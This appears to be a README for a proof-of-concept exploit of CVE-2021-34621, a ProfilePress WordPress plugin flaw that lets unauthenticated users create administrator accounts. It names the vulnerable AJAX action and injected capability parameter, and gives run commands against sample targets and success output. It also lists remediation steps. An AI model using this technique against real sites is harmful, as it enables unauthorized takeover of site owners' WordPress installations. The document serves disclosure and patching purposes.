
# CVE-2021-34621 – ProfilePress (WP User Avatar) Privilege Escalation

## 📖 Description
This proof-of-concept (PoC) exploits an **unauthenticated privilege escalation vulnerability** in the ProfilePress plugin (formerly WP User Avatar) for WordPress, versions **3.0.0 to 3.1.3**.  

An attacker can create a new WordPress administrator account **without any authentication**, even if user registration is disabled on the site.

> **CVE ID**: CVE-2021-34621  
> **CVSS Score**: 9.8 (Critical)  
> **Fixed version**: ProfilePress 3.1.4

---

## ⚙️ How It Works
The plugin exposes an AJAX action `pp_ajax_signup` that does not properly validate capabilities. By sending a crafted request with `wp_capabilities[administrator]=1`, the new user is granted administrative privileges.

---

## 🚀 Usage

### Requirements
- Python 3.6+
- `requests` library

Install dependencies:
```bash
pip3 install requests
```

### Run the exploit
```bash
python3 exploit_cve_2021_34621.py <target_url> [options]
```

#### Arguments
| Arg | Description |
|-----|-------------|
| `url` | Base WordPress URL (e.g., `http://192.168.56.104/wordpress/`) |
| `-u, --username` | Admin username to create (default: `attacker`) |
| `-e, --email` | Admin email address (default: `attacker@local.host`) |
| `-p, --password` | Admin password (default: `P@ssw0rd123`) |

#### Examples

**Basic usage (default credentials):**
```bash
python3 exploit_cve_2021_34621.py http://192.168.56.104/wordpress/
```

**Custom credentials:**
```bash
python3 exploit_cve_2021_34621.py https://victim.com/wp -u hacker -e hack@evil.com -p MyStr0ngP@ss
```

#### Successful output
```
[*] Targeting: http://192.168.56.104/wordpress/wp-admin/admin-ajax.php
[*] Creating admin user: hacker / MyStr0ngP@ss / hack@evil.com
[+] SUCCESS! Admin account created.
    Login at: http://192.168.56.104/wordpress/wp-login.php
    Username: hacker
    Password: MyStr0ngP@ss
```

---

## 🧪 Testing Environment
Tested against:
- WordPress 5.8 – 6.0
- ProfilePress 3.1.3
- PHP 7.4 / 8.0

---

## 🛡️ Remediation
- **Update ProfilePress to version 3.1.4 or later** immediately.
- If you cannot update, disable the plugin until a patch is applied.
- Monitor WordPress user accounts for unauthorized `administrator` role assignments.

---

## ⚠️ Legal Disclaimer
> This tool is provided **for educational purposes and authorized security testing only**.  
> Unauthorized use against systems you do not own or have explicit permission to test may violate local, state, and federal laws.  
> The author assumes no liability for misuse or damage caused by this software.

---

## 📚 References
- [NVD Entry – CVE-2021-34621](https://nvd.nist.gov/vuln/detail/CVE-2021-34621)
- [WordPress Plugin – ProfilePress](https://wordpress.org/plugins/wp-user-avatar/)
- [Original Discovery](https://www.wordfence.com/blog/2021/08/critical-privilege-escalation-vulnerability-patched-in-profilepress-plugin/)

---

## 📄 License
This project is licensed under the MIT License – see the [LICENSE](LICENSE) file for details.
```

---

Save this as `README.md` and then add, commit, push to GitHub:

```bash
git add README.md
git commit -m "Add detailed README"
git push
```
